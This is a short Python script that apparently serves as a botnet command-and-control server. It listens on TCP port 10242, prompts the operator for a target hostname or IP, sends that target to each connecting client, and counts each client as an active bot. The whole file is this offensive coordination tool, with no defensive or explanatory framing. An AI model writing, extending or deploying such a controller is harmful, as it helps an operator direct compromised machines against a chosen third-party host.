import socket

IP = ""
PORT = 10242
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
x = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[SOCKET CREATED]")
s.bind((IP, PORT))
print(f'[PORT BINDED]: {PORT}')
s.listen()
print("[LISTENING]")
hostname = str(input("[HOSTNAME/IP]:"))
while True:
    c, addr = s.accept()
    c.send(hostname.encode(FORMAT))
    c.close()
    x = x + 1
    print(f"[{x}][BOT ACTIVE]: {addr}")
s.close()
